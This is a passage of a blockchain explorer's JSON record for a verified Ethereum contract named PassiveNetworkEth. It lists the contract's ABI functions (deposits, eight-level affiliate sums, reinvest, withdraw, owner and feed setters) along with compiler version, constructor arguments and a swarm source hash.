ble\":false,\"stateMutability\":\"view\",\"type\":\"function\"},{\"constant\":true,\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"playerExit\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"payable\":false,\"stateMutability\":\"view\",\"type\":\"function\"},{\"constant\":true,\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"players\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"trxDeposit\",\"type\":\"uint256\"},{\"internalType\":\"uint256\",\"name\":\"time\",\"type\":\"uint256\"},{\"internalType\":\"uint256\",\"name\":\"interestProfit\",\"type\":\"uint256\"},{\"internalType\":\"uint256\",\"name\":\"affRewards\",\"type\":\"uint256\"},{\"internalType\":\"uint256\",\"name\":\"payoutSum\",\"type\":\"uint256\"},{\"internalType\":\"address\",\"name\":\"affFrom\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"aff1sum\",\"type\":\"uint256\"},{\"internalType\":\"uint256\",\"name\":\"aff2sum\",\"type\":\"uint256\"},{\"internalType\":\"uint256\",\"name\":\"aff3sum\",\"type\":\"uint256\"},{\"internalType\":\"uint256\",\"name\":\"aff4sum\",\"type\":\"uint256\"},{\"internalType\":\"uint256\",\"name\":\"aff5sum\",\"type\":\"uint256\"},{\"internalType\":\"uint256\",\"name\":\"aff6sum\",\"type\":\"uint256\"},{\"internalType\":\"uint256\",\"name\":\"aff7sum\",\"type\":\"uint256\"},{\"internalType\":\"uint256\",\"name\":\"aff8sum\",\"type\":\"uint256\"}],\"payable\":false,\"stateMutability\":\"view\",\"type\":\"function\"},{\"constant\":false,\"inputs\":[],\"name\":\"reinvest\",\"outputs\":[],\"payable\":false,\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"constant\":false,\"inputs\":[{\"internalType\":\"bool\",\"name\":\"_isOpen\",\"type\":\"bool\"}],\"name\":\"setOpen\",\"outputs\":[],\"payable\":false,\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"constant\":false,\"inputs\":[{\"internalType\":\"address\",\"name\":\"_address\",\"type\":\"address\"}],\"name\":\"setOwner\",\"outputs\":[],\"payable\":false,\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"constant\":true,\"inputs\":[],\"name\":\"techCommission\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"payable\":false,\"stateMutability\":\"view\",\"type\":\"function\"},{\"constant\":true,\"inputs\":[],\"name\":\"totalInvested\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"payable\":false,\"stateMutability\":\"view\",\"type\":\"function\"},{\"constant\":true,\"inputs\":[],\"name\":\"totalPayout\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"payable\":false,\"stateMutability\":\"view\",\"type\":\"function\"},{\"constant\":true,\"inputs\":[],\"name\":\"totalPlayers\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"payable\":false,\"stateMutability\":\"view\",\"type\":\"function\"},{\"constant\":false,\"inputs\":[{\"internalType\":\"address\",\"name\":\"_address\",\"type\":\"address\"}],\"name\":\"updateFeed1\",\"outputs\":[],\"payable\":false,\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"constant\":false,\"inputs\":[{\"internalType\":\"address\",\"name\":\"_address\",\"type\":\"address\"}],\"name\":\"updateFeed2\",\"outputs\":[],\"payable\":false,\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"constant\":false,\"inputs\":[],\"name\":\"withdraw\",\"outputs\":[],\"payable\":false,\"stateMutability\":\"nonpayable\",\"type\":\"function\"}]","ContractName":"PassiveNetworkEth","CompilerVersion":"v0.5.17+commit.d19bba13","OptimizationUsed":"0","Runs":"200","ConstructorArguments":"0000000000000000000000001809f0234302e2b5dfb192832afded04d66160520000000000000000000000007de65c08ddec290a4d2805012a80782ed0b7fe04","EVMVersion":"Default","Library":"","LicenseType":"None","Proxy":"0","Implementation":"","SwarmSource":"bzzr://4f374360dcaec086545b46c226d6019a4534767c032e1708ef349177073456e1"}]}